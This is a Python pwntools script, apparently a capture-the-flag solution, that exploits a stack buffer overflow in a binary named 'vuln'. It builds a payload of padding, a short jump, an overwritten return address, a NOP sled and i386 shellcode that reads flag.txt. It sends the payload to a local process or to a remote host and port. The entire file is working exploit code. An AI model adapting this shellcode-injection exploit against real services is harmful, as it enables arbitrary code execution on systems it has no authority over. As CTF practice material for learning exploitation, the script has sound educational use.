import argparse
import pwn



parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target","-t", type=str, default="",required=False)
parser.add_argument("--port","-p", type=int, default=0,required=False)
args = parser.parse_args()


elf = pwn.ELF('./vuln')

OFFSET = 24

short_jump = b"\xeb\x08\x90\x90"

new_eip = pwn.p32(0x0805334B) 

return_address = pwn.p32(elf.symbols["main"])

payload = b"".join(
    [
        b"A" * OFFSET,
        short_jump,
        new_eip,
        b"\x90" * 16,
        pwn.asm(pwn.shellcraft.i386.linux.cat("flag.txt"))
        #b"C" * 500,
    ]    
)

payload += b"\n"

with open("payload", "wb") as filp:
    filp.write(payload)

if args.destination == "local":
    p = elf.process()
elif args.destination == "remote":
    if not args.target or not args.port:
        pwn.warning("Suplly -t for target and -p for port")
        exit()
    p = pwn.remote(args.target, args.port)



p.sendline(payload)
print(p.recvall().decode("utf-8"))

